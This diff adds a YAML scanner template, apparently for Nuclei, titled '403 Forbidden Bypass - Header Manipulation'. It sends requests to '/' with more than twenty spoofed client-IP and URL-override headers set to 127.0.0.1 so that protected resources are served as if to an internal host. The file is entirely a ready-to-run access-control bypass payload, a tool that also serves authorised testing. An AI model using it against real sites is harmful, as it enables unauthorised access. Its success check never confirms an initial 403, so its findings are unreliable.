@@ -1,0 +1,93 @@
+id: 403-bypass-header
+name: 403 Forbidden Bypass - Header Manipulation
+version: 1.0
+author: GochaOqradze
+severity: high
+description: >
+  Attempts to bypass 403 Forbidden responses using various HTTP headers
+  that can influence access control decisions. Injects 127.0.0.1 in
+  headers like X-Forwarded-For, X-Real-IP, X-Custom-IP-Authorization,
+  and many others to simulate trusted internal network access.
+
+tags:
+  - bypass
+  - 403-bypass
+  - access-control
+  - header-manipulation
+
+requests:
+  - method: GET
+    path:
+      - "/"
+
+    redirects: false
+
+    headers:
+      X-Custom-IP-Authorization: "127.0.0.1"
+      X-Originating-IP: "127.0.0.1"
+      X-Forwarded-For: "127.0.0.1"
+      X-Remote-IP: "127.0.0.1"
+      X-Client-IP: "127.0.0.1"
+      X-Host: "127.0.0.1"
+      X-Forwarded-Host: "127.0.0.1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "len(body) > 0"
+
+  - method: GET
+    path:
+      - "/"
+
+    redirects: false
+
+    headers:
+      X-Real-IP: "127.0.0.1"
+      X-True-IP: "127.0.0.1"
+      CF-Connecting-IP: "127.0.0.1"
+      Client-IP: "127.0.0.1"
+      True-Client-IP: "127.0.0.1"
+      Forwarded-For: "127.0.0.1"
+      Forwarded: "for=127.0.0.1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "len(body) > 0"
+
+  - method: GET
+    path:
+      - "/"
+
+    redirects: false
+
+    headers:
+      X-Original-URL: "/"
+      X-Rewrite-URL: "/"
+      X-Forwarded-Proto: "https"
+      X-Forwarded-Server: "127.0.0.1"
+      X-ProxyUser-Ip: "127.0.0.1"
+      X-Original-Remote-Addr: "127.0.0.1"
+      X-Remote-Addr: "127.0.0.1"
+      X-HTTP-Host-Override: "127.0.0.1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "len(body) > 0"
